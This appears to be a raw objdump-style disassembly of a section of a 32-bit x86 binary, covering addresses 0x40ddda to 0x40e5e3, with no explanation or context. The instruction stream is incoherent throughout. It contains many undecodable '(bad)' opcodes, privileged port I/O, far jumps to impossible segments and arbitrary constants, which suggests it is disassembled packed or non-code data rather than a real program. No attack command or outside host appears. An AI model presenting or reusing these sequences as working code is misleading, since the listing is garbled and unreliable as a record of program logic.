  40ddda:	ins    BYTE PTR es:[edi],dx
  40dddb:	mov    dh,0x2c
  40dddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddde:	mov    ds:0x3310ae76,eax
  40dde3:	mov    ebp,ecx
  40dde5:	or     eax,0x188e4a20
  40ddea:	ret    0x104b
  40dded:	dec    ecx
  40ddee:	inc    esp
  40ddef:	inc    esi
  40ddf0:	add    DWORD PTR [edx],ebx
  40ddf2:	xchg   esp,eax
  40ddf3:	das    
  40ddf4:	mov    ebx,0x918ecff7
  40ddf9:	mov    ds,ebx
  40ddfb:	enter  0xdd75,0x1a
  40ddff:	sbb    BYTE PTR [esi-0x42c7379d],dh
  40de05:	adc    al,0xf1
  40de07:	int3   
  40de08:	jo     0x40de19
  40de0a:	mov    eax,ds:0xce77c48b
  40de0f:	es fs mov al,0xce
  40de13:	mov    WORD PTR [ecx+0xc],ss
  40de16:	mov    WORD PTR [edx-0x4c],ss
  40de19:	mov    edx,0xca78f954
  40de1e:	mov    ah,0x49
  40de20:	jle    0x40de36
  40de22:	(bad)  
  40de23:	pop    ebp
  40de24:	std    
  40de25:	add    BYTE PTR [ebp-0x69e69a19],dl
  40de2b:	dec    edx
  40de2c:	add    al,0x6f
  40de2e:	inc    edx
  40de2f:	fstp   QWORD PTR [ecx]
  40de31:	dec    ecx
  40de32:	jb     0x40dea2
  40de34:	inc    esi
  40de35:	arpl   WORD PTR [edx-0x2d],sp
  40de38:	push   edx
  40de39:	inc    esi
  40de3a:	ss or  esi,ebx
  40de3d:	inc    ecx
  40de3e:	cmp    eax,0x8f0041f
  40de43:	std    
  40de44:	not    dh
  40de46:	add    al,0x38
  40de48:	inc    esp
  40de49:	fwait
  40de4a:	test   ch,bl
  40de4c:	stos   BYTE PTR es:[edi],al
  40de4d:	popa   
  40de4e:	or     DWORD PTR [edx-0x77],edi
  40de51:	(bad)  
  40de52:	int3   
  40de53:	jge    0x40dea3
  40de55:	iret   
  40de56:	int    0x36
  40de58:	cli    
  40de59:	inc    edx
  40de5a:	mov    esi,0x76c57fd3
  40de5f:	(bad)
  40de65:	mov    eax,ds:0xb1e5bdb7
  40de6a:	pushf  
  40de6b:	add    DWORD PTR [eax-0x1aec3af],0x14
  40de72:	xchg   DWORD PTR [ecx+0x17],esi
  40de75:	sub    al,ah
  40de77:	into   
  40de78:	mov    bh,0x84
  40de7a:	and    BYTE PTR [ebx+0x2fb99699],bh
  40de80:	xor    DWORD PTR [eax-0x523346f1],ecx
  40de86:	repnz neg DWORD PTR [edi-0x21b28938]
  40de8d:	pop    es
  40de8e:	enter  0xfa2,0x1f
  40de92:	mov    bh,0x69
  40de94:	pop    eax
  40de95:	mov    ecx,0x8ac54d40
  40de9a:	repnz mov WORD PTR [esi+0x3117c6f5],gs
  40dea1:	repz dec ebp
  40dea3:	shl    dl,1
  40dea5:	in     eax,0x4e
  40dea7:	pop    esi
  40dea8:	cmc    
  40dea9:	jl     0x40de78
  40deab:	sub    DWORD PTR [edx],0xebabfe7f
  40deb1:	jne    0x40de6c
  40deb3:	inc    ebp
  40deb4:	lahf   
  40deb5:	rol    BYTE PTR [ebx+ebp*1-0x6d2c1223],0x1b
  40debd:	popf   
  40debe:	sub    DWORD PTR [ebx-0x2f0b355],edx
  40dec4:	addr16 mov al,ds:0x81c1
  40dec8:	mov    dl,0xf
  40deca:	retf   
  40decb:	js     0x40deb0
  40decd:	add    DWORD PTR [ecx-0x6563e279],ecx
  40ded3:	dec    eax
  40ded4:	cmp    BYTE PTR [ebp+0x27],dh
  40ded7:	or     cl,cl
  40ded9:	pop    ebx
  40deda:	xchg   DWORD PTR [edi+0x23],edx
  40dedd:	rol    BYTE PTR [esi-0x571c12f],0xfc
  40dee4:	mov    DWORD PTR [ebx],esi
  40dee6:	or     DWORD PTR [esi+0x15],edx
  40dee9:	or     al,0xca
  40deeb:	retf   0xd378
  40deee:	enter  0xe5cb,0xce
  40def2:	xchg   DWORD PTR gs:[ebx-0x1197641e],ebx
  40def9:	and    edi,ebx
  40defb:	inc    edi
  40defc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40defd:	hlt    
  40defe:	mov    cl,0xac
  40df00:	adc    al,BYTE PTR [ecx+0x1]
  40df03:	(bad)  
  40df04:	out    0x70,eax
  40df06:	adc    BYTE PTR [ebp+0xb484260],0x7
  40df0d:	mov    ebx,0x363b652a
  40df12:	adc    dl,BYTE PTR [ebp+0xc73d31b]
  40df18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df19:	mov    dl,0x44
  40df1b:	xor    edx,ebp
  40df1d:	adc    edi,ebp
  40df1f:	aam    0x7
  40df21:	and    cl,bh
  40df23:	int    0x7e
  40df25:	or     BYTE PTR [esp+edi*8+0x3f22a490],bl
  40df2c:	call   FWORD PTR [ecx+0x6cfdef9a]
  40df32:	hlt    
  40df33:	cld    
  40df34:	stc    
  40df35:	pop    ds
  40df36:	ja     0x40df9c
  40df38:	mov    ds:0x454c06a4,al
  40df3d:	ret    0xbd01
  40df40:	jp     0x40df56
  40df42:	push   cs
  40df43:	out    0x2a,al
  40df45:	push   esp
  40df46:	pop    edx
  40df47:	fimul  DWORD PTR [esi]
  40df49:	mov    eax,0x74d7d901
  40df4e:	std    
  40df4f:	arpl   WORD PTR [eax-0x798237eb],si
  40df55:	lahf   
  40df56:	aas    
  40df57:	lahf   
  40df58:	jne    0x40df1a
  40df5a:	mov    al,dl
  40df5c:	jle    0x40df2c
  40df5e:	mov    ch,0x1c
  40df60:	mov    ah,0x31
  40df62:	sbb    BYTE PTR [ebx+0x1f],bh
  40df65:	mov    esp,0xfcfa76f3
  40df6a:	adc    al,0x3e
  40df6c:	ret    
  40df6d:	out    0x93,eax
  40df6f:	fcom   QWORD PTR ds:0x2f32ffed
  40df75:	adc    al,0x4a
  40df77:	jle    0x40dff8
  40df79:	pop    ebx
  40df7a:	test   DWORD PTR [eax+ebx*8-0x10],edi
  40df7e:	cld    
  40df7f:	cmp    DWORD PTR [edx-0x39],0x1d322000
  40df86:	cs ds mov cl,0x79
  40df8a:	pop    es
  40df8b:	pop    esp
  40df8c:	out    0x58,eax
  40df8e:	mov    cl,0xa3
  40df90:	shl    DWORD PTR [eax+0x3f3c950b],cl
  40df96:	push   ebx
  40df97:	push   cs
  40df98:	fdivr  QWORD PTR cs:[edi-0x2]
  40df9c:	ss dec ebp
  40df9e:	rcl    BYTE PTR [esi+0x66],0xf0
  40dfa2:	int    0x13
  40dfa4:	sbb    al,0x1
  40dfa6:	test   eax,0x58c17bf9
  40dfab:	add    eax,ecx
  40dfad:	leave  
  40dfae:	inc    ebx
  40dfaf:	inc    eax
  40dfb0:	jb     0x40df36
  40dfb2:	mov    esi,0x4ad8c0d4
  40dfb7:	cdq    
  40dfb8:	pop    ecx
  40dfb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfba:	lods   al,BYTE PTR ds:[esi]
  40dfbb:	xlat   BYTE PTR ds:[ebx]
  40dfbc:	imul   esi,DWORD PTR [edi-0x37356d2e],0xffffff9a
  40dfc3:	inc    edx
  40dfc4:	mov    ?,ebx
  40dfc6:	inc    eax
  40dfc7:	pop    ss
  40dfc8:	and    bl,ah
  40dfca:	outs   dx,DWORD PTR ds:[esi]
  40dfcb:	mov    WORD PTR [eax],gs
  40dfcd:	or     dh,BYTE PTR [edi-0x68f4d623]
  40dfd3:	aaa    
  40dfd4:	pop    esi
  40dfd5:	shl    BYTE PTR [eax],1
  40dfd7:	mov    edi,0x360de59f
  40dfdc:	bound  ecx,QWORD PTR [ebx]
  40dfde:	pop    ebx
  40dfdf:	jbe    0x40dfcf
  40dfe1:	mov    DWORD PTR [ebx+0x7456b146],0x9de89f89
  40dfeb:	xchg   ecx,eax
  40dfec:	cwde   
  40dfed:	repz jmp 0x40dfb1
  40dff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dff1:	pusha  
  40dff2:	add    bh,BYTE PTR [ecx+0x410f4d0a]
  40dff8:	enter  0x58ae,0x34
  40dffc:	(bad)  
  40dffd:	xchg   edx,eax
  40dffe:	jbe    0x40dfa5
  40e000:	test   DWORD PTR [ebx+esi*4],ebp
  40e003:	add    cl,BYTE PTR [ebx+0x45b39c9f]
  40e009:	int3   
  40e00a:	sbb    BYTE PTR [edi-0x52],bh
  40e00d:	xor    BYTE PTR [edx+0x71ea737c],0xaf
  40e014:	xor    al,0x4b
  40e016:	add    al,0xf2
  40e018:	fbstp  TBYTE PTR [ebp-0x58]
  40e01b:	sub    DWORD PTR [ecx+0xb3c6cc9],0x48
  40e022:	out    dx,eax
  40e023:	jae    0x40dfca
  40e025:	push   es
  40e026:	cmp    al,0x38
  40e028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e029:	pop    esi
  40e02a:	push   eax
  40e02b:	cmp    edi,eax
  40e02d:	fwait
  40e02e:	repz pushf 
  40e030:	push   cs
  40e031:	and    ah,BYTE PTR [esi+0x2a201344]
  40e037:	push   eax
  40e038:	repz out 0x4a,eax
  40e03b:	fcomp  DWORD PTR [ebp-0x525fe2bc]
  40e041:	or     eax,0xac86fa78
  40e046:	iret   
  40e047:	jns    0x40e011
  40e049:	imul   DWORD PTR [edi-0x67fc8251]
  40e04f:	daa    
  40e050:	mov    cl,BYTE PTR [ebx]
  40e052:	or     BYTE PTR [esi],0x5a
  40e055:	inc    edi
  40e056:	push   eax
  40e057:	inc    edi
  40e058:	inc    ebp
  40e059:	and    eax,0x6ad188b
  40e05e:	mov    al,0xaf
  40e060:	out    dx,eax
  40e061:	imul   ebp,DWORD PTR [ecx],0x296860cf
  40e067:	retf   0x6e5c
  40e06a:	mov    esi,0xaec9aaf9
  40e06f:	jmp    DWORD PTR [eax-0x1caee5ad]
  40e075:	push   edi
  40e076:	xor    al,dh
  40e078:	or     ecx,ebx
  40e07a:	push   0x1058ef53
  40e07f:	push   edi
  40e080:	push   ebp
  40e081:	fcmovbe st,st(7)
  40e083:	and    BYTE PTR [eax+esi*2-0x43],ah
  40e087:	push   edi
  40e088:	adc    eax,0x7c2c7ed3
  40e08d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e08e:	sar    BYTE PTR [esi+0x48],cl
  40e091:	cmp    BYTE PTR [esi+0x3d858f91],ch
  40e097:	push   ebp
  40e098:	call   0x6483:0xd5b93cdb
  40e09f:	ss aam 0xfb
  40e0a2:	sbb    al,0x9c
  40e0a4:	cmp    al,0x46
  40e0a6:	cmp    eax,0x2845b894
  40e0ab:	xchg   BYTE PTR [eax],ah
  40e0ad:	shl    BYTE PTR ds:0xdc17f6e4,1
  40e0b3:	add    esp,eax
  40e0b5:	dec    esp
  40e0b6:	out    dx,al
  40e0b7:	mov    al,cs:0xaa33727
  40e0bd:	pop    ss
  40e0be:	cmp    edx,ebx
  40e0c0:	fisttp WORD PTR [ebx]
  40e0c2:	aas    
  40e0c3:	mov    bh,0xa0
  40e0c5:	call   0xecec929
  40e0ca:	arpl   WORD PTR [ecx],sp
  40e0cc:	mov    ds:0xcc7d7f49,al
  40e0d1:	sub    dh,BYTE PTR [ecx]
  40e0d3:	je     0x40e0f8
  40e0d5:	cmp    cl,ch
  40e0d7:	out    dx,al
  40e0d8:	jp     0x40e143
  40e0da:	scas   al,BYTE PTR es:[edi]
  40e0db:	mov    WORD PTR [eax],ss
  40e0dd:	jnp    0x40e14f
  40e0df:	lea    edi,[edx]
  40e0e1:	cmp    eax,0x74368009
  40e0e6:	mov    ecx,0x3c4d2cad
  40e0eb:	aaa    
  40e0ec:	adc    edx,DWORD PTR [edi]
  40e0ee:	xor    bl,BYTE PTR [eax]
  40e0f0:	add    cl,BYTE PTR [ebx-0x1]
  40e0f3:	sub    dh,BYTE PTR [ebx+0x280b6562]
  40e0f9:	mov    cl,0xcd
  40e0fb:	fisubr WORD PTR [edx+esi*8]
  40e0fe:	jecxz  0x40e0e0
  40e100:	lea    ecx,[ebp+0x1b]
  40e103:	xchg   edi,eax
  40e104:	psubw  mm5,QWORD PTR [eax]
  40e107:	and    al,0xa7
  40e109:	clc    
  40e10a:	aam    0xe2
  40e10c:	pushf  
  40e10d:	push   DWORD PTR [ecx+esi*8+0x74]
  40e111:	cmp    al,0xd5
  40e113:	std    
  40e114:	retf   
  40e115:	inc    ebp
  40e116:	outs   dx,DWORD PTR ds:[esi]
  40e117:	adc    BYTE PTR [ebx-0x3b],dh
  40e11a:	in     al,dx
  40e11b:	sbb    al,0x51
  40e11d:	inc    edi
  40e11e:	icebp  
  40e11f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e120:	sub    eax,0x853d6708
  40e125:	dec    esi
  40e126:	js     0x40e0c7
  40e128:	scas   al,BYTE PTR es:[edi]
  40e129:	jle    0x40e18b
  40e12b:	fiadd  WORD PTR [esi]
  40e12d:	jmp    0x4b92:0x523a3f54
  40e134:	pop    es
  40e135:	or     eax,0x9dfa3637
  40e13a:	(bad)  
  40e13b:	xchg   edx,eax
  40e13c:	add    al,0x4
  40e13e:	sub    BYTE PTR [esp+ebx*4+0x0],bl
  40e142:	inc    edx
  40e143:	out    dx,al
  40e144:	lds    edi,FWORD PTR [edi+0x3c16b66e]
  40e14a:	in     al,0x4d
  40e14c:	mov    ah,0x1a
  40e14e:	leave  
  40e14f:	jae    0x40e0e2
  40e151:	push   esp
  40e152:	mov    ch,0xdd
  40e154:	jg     0x40e144
  40e156:	call   0x954b88cb
  40e15b:	dec    eax
  40e15c:	mov    ?,WORD PTR ds:0x25cffb9e
  40e162:	add    al,0x78
  40e164:	inc    esi
  40e165:	pop    ebp
  40e166:	pop    edx
  40e167:	iret   
  40e168:	sub    eax,esi
  40e16a:	adc    DWORD PTR [esi-0x44],esi
  40e16d:	pusha  
  40e16e:	add    al,0xa3
  40e170:	je     0x40e0fc
  40e172:	shl    BYTE PTR [edi+0x4e],cl
  40e175:	and    eax,0x719e725e
  40e17a:	mov    ebx,0xd5c70f3d
  40e17f:	pop    edi
  40e180:	lods   eax,DWORD PTR ds:[esi]
  40e181:	jl     0x40e1ea
  40e183:	xor    al,0x99
  40e185:	add    dl,BYTE PTR [edi-0x7a]
  40e188:	mov    ch,0x8f
  40e18a:	sub    BYTE PTR [edx+0x6b4cab6d],0x8d
  40e191:	outs   dx,DWORD PTR ds:[esi]
  40e192:	adc    ah,BYTE PTR cs:[eax]
  40e195:	sbb    eax,0x1b466ee
  40e19a:	retf   
  40e19b:	sub    DWORD PTR [edx-0x2093faab],0x66afe249
  40e1a5:	inc    esi
  40e1a6:	js     0x40e1cc
  40e1a8:	jbe    0x40e21a
  40e1aa:	mov    ?,WORD PTR [edi-0x7b]
  40e1ad:	inc    ebp
  40e1ae:	xchg   ebp,eax
  40e1af:	in     eax,0x43
  40e1b1:	inc    ebp
  40e1b2:	int3   
  40e1b3:	mov    ecx,0xa1f267f9
  40e1b8:	add    cl,BYTE PTR [esi-0x4]
  40e1bb:	mov    BYTE PTR [edx],dh
  40e1bd:	add    al,dh
  40e1bf:	outs   dx,DWORD PTR ds:[esi]
  40e1c0:	mov    eax,0xab5aaec8
  40e1c5:	ret    0x65a6
  40e1c8:	jmp    0xa8cc:0x324854f8
  40e1cf:	xor    eax,0x4e0496b2
  40e1d4:	cli    
  40e1d5:	jno    0x40e229
  40e1d7:	jno    0x40e243
  40e1d9:	repz or ebp,DWORD PTR [edx-0x585a7711]
  40e1e0:	(bad)  
  40e1e1:	in     eax,0x2d
  40e1e3:	xor    DWORD PTR [ecx],eax
  40e1e5:	adc    eax,0x79db8e05
  40e1ea:	sub    dl,BYTE PTR ds:[eax+0x5d784d1c]
  40e1f1:	icebp  
  40e1f2:	add    ch,bl
  40e1f4:	push   ebx
  40e1f5:	retf   
  40e1f6:	shl    BYTE PTR [esi+0x8],0xe4
  40e1fa:	or     DWORD PTR [esi],ecx
  40e1fc:	mov    ds:0xa59a65df,al
  40e201:	sahf   
  40e202:	in     eax,dx
  40e203:	stos   DWORD PTR es:[edi],eax
  40e204:	pop    esi
  40e205:	enter  0x65df,0x4
  40e209:	repz jnp 0x40e243
  40e20c:	pop    edi
  40e20d:	cwde   
  40e20e:	mov    eax,0x39a2665c
  40e213:	add    esp,DWORD PTR [ebx-0x7]
  40e216:	pushf  
  40e217:	dec    eax
  40e218:	push   ebp
  40e219:	xchg   esi,eax
  40e21a:	inc    edx
  40e21b:	inc    ecx
  40e21c:	fdiv   QWORD PTR [edx+0x5cda2ea3]
  40e222:	test   BYTE PTR [edi],0xa8
  40e225:	and    al,0x5e
  40e227:	pop    edx
  40e228:	xchg   edi,eax
  40e229:	sbb    BYTE PTR [edx],0x33
  40e22c:	add    DWORD PTR [edx+ebp*1-0x49afcf35],ecx
  40e233:	outs   dx,BYTE PTR ds:[esi]
  40e234:	xlat   BYTE PTR ds:[ebx]
  40e235:	jnp    0x40e26c
  40e237:	inc    esp
  40e238:	xchg   esp,eax
  40e239:	aaa    
  40e23a:	sub    ebp,DWORD PTR [edi+0xa]
  40e23d:	jmp    0xe793:0x306acca4
  40e244:	mov    edi,0xef94f4d8
  40e249:	enter  0xd2f9,0x92
  40e24d:	ja     0x40e1d5
  40e24f:	mov    eax,0xffb8d62e
  40e254:	add    eax,0x54d90e2e
  40e259:	and    eax,0x1694456a
  40e25e:	sbb    eax,0x77c94230
  40e263:	fmul   DWORD PTR [ebp+0x62]
  40e266:	mov    ch,0x95
  40e268:	jl     0x40e2bc
  40e26a:	test   BYTE PTR [ecx],ah
  40e26c:	daa    
  40e26d:	sbb    bl,BYTE PTR [esi+0x67]
  40e270:	retf   0xd811
  40e273:	pop    eax
  40e274:	clc    
  40e275:	lds    esp,FWORD PTR [edx+0x4]
  40e278:	retf   0x6683
  40e27b:	mov    dl,0x50
  40e27d:	clc    
  40e27e:	lahf   
  40e27f:	out    dx,eax
  40e280:	or     BYTE PTR ds:0xa0834598,0x6e
  40e287:	out    0x95,al
  40e289:	adc    eax,0x2a48a29e
  40e28e:	push   esi
  40e28f:	lods   eax,DWORD PTR ds:[esi]
  40e290:	mov    ds:0x3cbf4af5,al
  40e295:	mov    ebx,0x386bf459
  40e29a:	mov    al,0x59
  40e29c:	xor    ebx,DWORD PTR [ebx+0x25]
  40e29f:	mov    ch,0xef
  40e2a1:	stos   BYTE PTR es:[edi],al
  40e2a2:	test   BYTE PTR [eax],0xa2
  40e2a5:	retf   0x1441
  40e2a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2a9:	jnp    0x40e2db
  40e2ab:	mov    DWORD PTR [ebx],edx
  40e2ad:	out    0xc2,al
  40e2af:	icebp  
  40e2b0:	mov    ebp,0x63138b1
  40e2b5:	add    al,0xbd
  40e2b7:	add    eax,0x1f8b5c06
  40e2bc:	push   ss
  40e2bd:	addr16 mov eax,0x25d3e66f
  40e2c3:	xchg   ebx,eax
  40e2c4:	adc    al,0xc0
  40e2c6:	cmc    
  40e2c7:	das    
  40e2c8:	push   ds
  40e2c9:	icebp  
  40e2ca:	inc    eax
  40e2cb:	sub    bl,bl
  40e2cd:	dec    ebp
  40e2ce:	fistp  DWORD PTR [esi-0x40]
  40e2d1:	mov    cl,0x51
  40e2d3:	cdq    
  40e2d4:	in     al,0xbb
  40e2d6:	inc    ebp
  40e2d7:	jl     0x40e325
  40e2d9:	dec    eax
  40e2da:	ja     0x40e2b2
  40e2dc:	push   0x82d543b0
  40e2e1:	aas    
  40e2e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2e3:	jp     0x40e27b
  40e2e5:	mul    BYTE PTR [eax+0x2c1bee56]
  40e2eb:	xor    ah,BYTE PTR [edi+0x6db070ba]
  40e2f1:	es mov dl,0x74
  40e2f4:	adc    ch,BYTE PTR [eax]
  40e2f6:	(bad)  
  40e2f7:	in     eax,0x26
  40e2f9:	jle    0x40e2d2
  40e2fb:	pop    esp
  40e2fc:	cdq    
  40e2fd:	pop    esi
  40e2fe:	mov    ebx,0x7091ba82
  40e303:	iret   
  40e304:	jae    0x40e2bd
  40e306:	jno    0x40e366
  40e308:	jle    0x40e2ca
  40e30a:	mov    WORD PTR [ebx-0x2],cs
  40e30d:	pop    esi
  40e30e:	xchg   DWORD PTR [esi-0x30aa44e7],ebx
  40e314:	in     eax,0x7e
  40e316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e317:	sbb    dl,BYTE PTR [eax+0x53]
  40e31a:	mov    DWORD PTR [ecx-0x5697bca9],edi
  40e320:	mov    bl,0x5d
  40e322:	mov    ebp,0x7fa9e5c2
  40e327:	nop
  40e328:	add    al,0xa1
  40e32a:	fs jno 0x40e2e2
  40e32d:	out    dx,eax
  40e32e:	pop    esp
  40e32f:	mov    BYTE PTR [edx+0x17],cl
  40e332:	loopne 0x40e310
  40e334:	add    al,0xf9
  40e336:	cdq    
  40e337:	test   eax,0xf6e4c62b
  40e33c:	(bad)  
  40e33d:	lods   al,BYTE PTR ds:[esi]
  40e33e:	sbb    BYTE PTR [ebx+0x6],0xb8
  40e342:	test   BYTE PTR [esi+0x6600f7f9],al
  40e348:	mov    dh,0xa0
  40e34a:	in     al,dx
  40e34b:	xchg   edx,eax
  40e34c:	cwde   
  40e34d:	(bad)  
  40e34e:	fidivr DWORD PTR [ebp+0x56]
  40e351:	xchg   edi,eax
  40e352:	addr16 (bad) 
  40e354:	repnz (bad)
  40e358:	mov    ds:0xa286f571,eax
  40e35d:	xor    DWORD PTR [edi],ecx
  40e35f:	adc    esp,DWORD PTR [esp+ebx*2]
  40e362:	sub    al,BYTE PTR [edi+eax*8-0x29]
  40e366:	or     eax,0x3f787f42
  40e36b:	xor    cl,BYTE PTR [ebp+0x413b9a34]
  40e371:	xor    eax,0xddf36f79
  40e376:	jmp    0x40e3b4
  40e378:	pop    ds
  40e379:	test   esp,0x90144e11
  40e37f:	arpl   bp,ax
  40e381:	mov    al,0xd7
  40e383:	fcom   QWORD PTR [ebx+0x598e3a54]
  40e389:	mov    dh,0x5b
  40e38b:	icebp  
  40e38c:	aaa    
  40e38d:	cmp    eax,ebx
  40e38f:	sar    dh,cl
  40e391:	pusha  
  40e392:	mov    cl,0x40
  40e394:	out    dx,al
  40e395:	cmp    al,0x22
  40e397:	add    DWORD PTR [edi-0x4b],0x8ac62867
  40e39e:	jge    0x40e392
  40e3a0:	adc    esi,ecx
  40e3a2:	push   esi
  40e3a3:	fld    DWORD PTR [esi+0xe]
  40e3a6:	mov    ch,0x30
  40e3a8:	or     eax,0x3b53f04f
  40e3ad:	ins    DWORD PTR es:[edi],dx
  40e3ae:	fsubr  QWORD PTR [ebp+0x4a16a06d]
  40e3b4:	js     0x40e3f2
  40e3b6:	les    edx,FWORD PTR [ebx+0x1c60c3f9]
  40e3bc:	lods   al,BYTE PTR ds:[esi]
  40e3bd:	jo     0x40e3c0
  40e3bf:	jne    0x40e3be
  40e3c1:	push   ss
  40e3c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3c3:	sub    eax,0x65d4e2b3
  40e3c8:	int    0x72
  40e3ca:	hlt    
  40e3cb:	pop    ebp
  40e3cc:	jae    0x40e412
  40e3ce:	adc    cl,dl
  40e3d0:	ins    DWORD PTR es:[edi],dx
  40e3d1:	and    eax,0x3561e33f
  40e3d6:	xchg   cl,ah
  40e3d8:	daa    
  40e3d9:	cmp    DWORD PTR [esi-0x27],0x219badbc
  40e3e0:	test   BYTE PTR [esi+ebp*1-0x20],cl
  40e3e4:	push   ebx
  40e3e5:	push   ecx
  40e3e6:	and    DWORD PTR [ebx+ebp*2],ebx
  40e3e9:	xor    al,0x1
  40e3eb:	and    edi,DWORD PTR [esi]
  40e3ed:	dec    esi
  40e3ee:	loope  0x40e3eb
  40e3f0:	jl     0x40e44d
  40e3f2:	mov    ds:0xb9d0d305,eax
  40e3f7:	or     DWORD PTR [edi+ebp*2+0x2b9b8e44],ebp
  40e3fe:	inc    esi
  40e3ff:	hlt    
  40e400:	xchg   BYTE PTR [edi+0x2f],dh
  40e403:	daa    
  40e404:	xor    al,0xbf
  40e406:	arpl   WORD PTR [eax-0x7a2f567d],di
  40e40c:	retf   0x8520
  40e40f:	loopne 0x40e3ff
  40e411:	inc    ebx
  40e412:	jge    0x40e481
  40e414:	adc    al,0x75
  40e416:	push   ecx
  40e417:	pop    edi
  40e418:	inc    edi
  40e419:	pop    edi
  40e41a:	pop    esp
  40e41b:	push   ebx
  40e41c:	fisub  DWORD PTR [ebp-0x36]
  40e41f:	and    BYTE PTR [esi+ebp*2],0x18
  40e423:	(bad)  
  40e424:	cdq    
  40e425:	pop    es
  40e426:	cmc    
  40e427:	(bad)  
  40e428:	cmp    cl,bl
  40e42a:	inc    eax
  40e42b:	adc    al,0x81
  40e42d:	test   al,0x11
  40e42f:	sub    eax,0x29e9d6cf
  40e434:	jl     0x40e424
  40e436:	es push eax
  40e438:	add    BYTE PTR [esi+eax*8+0x54a7d982],ah
  40e43f:	jnp    0x40e496
  40e441:	std    
  40e442:	stc    
  40e443:	ret    0x8b3d
  40e446:	mov    eax,0x1997be35
  40e44b:	xlat   BYTE PTR ds:[ebx]
  40e44c:	xor    eax,0x898afe81
  40e451:	jno    0x40e46f
  40e453:	jmp    0x40e416
  40e455:	in     al,dx
  40e456:	std    
  40e457:	xor    esp,DWORD PTR [edi]
  40e459:	lds    edx,FWORD PTR [eax-0x66]
  40e45c:	loop   0x40e4bf
  40e45e:	pop    esp
  40e45f:	(bad)  
  40e460:	ss loop 0x40e4c5
  40e463:	sbb    BYTE PTR [ebx],dh
  40e465:	inc    esp
  40e466:	jns    0x40e4ca
  40e468:	aad    0x1d
  40e46a:	sahf   
  40e46b:	inc    esp
  40e46c:	dec    eax
  40e46d:	lahf   
  40e46e:	test   eax,0xda804c11
  40e473:	ss lock sbb edx,DWORD PTR gs:[ecx+0x54]
  40e479:	ds pop edi
  40e47b:	enter  0x83e9,0xb
  40e47f:	adc    bh,BYTE PTR ds:0x89b9e9d4
  40e485:	js     0x40e4d8
  40e487:	sbb    DWORD PTR [edx+0x185ff406],ebx
  40e48d:	dec    eax
  40e48e:	test   al,0x7a
  40e490:	cmp    BYTE PTR [esp+eiz*8+0x2415],0x0
	...
  40e514:	pop    ebx
  40e515:	ins    DWORD PTR es:[edi],dx
  40e516:	add    esi,DWORD PTR ds:0x6f7f7f37
  40e51c:	pop    eax
  40e51d:	je     0x40e4cc
  40e51f:	rol    al,1
  40e521:	mov    cs,esp
  40e523:	inc    esp
  40e524:	xchg   edi,eax
  40e525:	xchg   edx,eax
  40e526:	add    BYTE PTR [eax],al
  40e528:	imul   eax,DWORD PTR [edi],0xa9640000
  40e52e:	ins    BYTE PTR es:[edi],dx
  40e52f:	outs   dx,BYTE PTR ds:[esi]
  40e530:	shl    DWORD PTR es:[ebx-0x20],cl
  40e534:	jge    0x40e523
  40e536:	out    dx,eax
  40e537:	ins    DWORD PTR es:[edi],dx
  40e538:	outs   dx,BYTE PTR ds:[esi]
  40e539:	mov    edx,DWORD PTR [edi]
  40e53b:	fsub   QWORD PTR [edx+0x10]
  40e53e:	sub    DWORD PTR [eax+ecx*8-0xd43c460],0xffffff8a
  40e546:	punpcklbw mm7,DWORD PTR [edx]
  40e549:	sbb    BYTE PTR [ecx+0x524934ac],ah
  40e54f:	mov    ebp,esi
  40e551:	aad    0xe7
  40e553:	inc    ecx
  40e554:	pop    eax
  40e555:	leave  
  40e556:	xor    eax,0xccdc058e
  40e55b:	pop    esp
  40e55c:	aas    
  40e55d:	mov    ebx,0xd53bff59
  40e562:	stos   DWORD PTR es:[edi],eax
  40e563:	push   cs
  40e564:	aaa    
  40e565:	mov    bl,0x91
  40e567:	iret   
  40e568:	pop    ebx
  40e569:	shr    BYTE PTR [edi],cl
  40e56b:	mov    ah,0xdc
  40e56d:	push   ecx
  40e56e:	scas   eax,DWORD PTR es:[edi]
  40e56f:	test   eax,0x8f6d32de
  40e574:	sti    
  40e575:	enter  0x2532,0xcb
  40e579:	adc    al,0xe
  40e57b:	retf   
  40e57c:	jo     0x40e599
  40e57e:	add    esp,DWORD PTR [edi]
  40e580:	pop    esp
  40e581:	jp     0x40e545
  40e583:	push   esi
  40e584:	mov    cl,bl
  40e586:	jmp    0x2499:0x700b14ec
  40e58d:	sub    edx,DWORD PTR [edx]
  40e58f:	imul   BYTE PTR [eax]
  40e591:	fidivr DWORD PTR [ecx+0x72]
  40e594:	scas   al,BYTE PTR es:[edi]
  40e595:	and    eax,0x40613b5d
  40e59a:	sbb    al,0x34
  40e59c:	mov    ah,0xe4
  40e59e:	pop    edi
  40e59f:	xor    DWORD PTR [edi-0x4db0ba],0xffffffae
  40e5a6:	shl    BYTE PTR [edx],cl
  40e5a8:	lock xchg esi,eax
  40e5aa:	fisub  WORD PTR [edi+esi*8]
  40e5ad:	cs mov edi,0x4c7f3b72
  40e5b3:	rol    BYTE PTR [ebp+0x5f1304a0],0xb8
  40e5ba:	push   ds
  40e5bb:	fsub   QWORD PTR [ecx-0x5f]
  40e5be:	ins    BYTE PTR es:[edi],dx
  40e5bf:	cmc    
  40e5c0:	loop   0x40e60a
  40e5c2:	loop   0x40e631
  40e5c4:	aaa    
  40e5c5:	data16 lahf 
  40e5c7:	push   ecx
  40e5c8:	ins    BYTE PTR es:[edi],dx
  40e5c9:	mov    ds:0x2c93e3c9,eax
  40e5ce:	pusha  
  40e5cf:	add    ebx,DWORD PTR [edx-0x4a]
  40e5d2:	fst    DWORD PTR [ebx]
  40e5d4:	xchg   ecx,eax
  40e5d5:	call   0xb925:0x7dfa5d13
  40e5dc:	call   0x7315:0x87523e80
  40e5e3:	imul   esi,DWORD PTR [edx-0x7b],0x4cb1deac
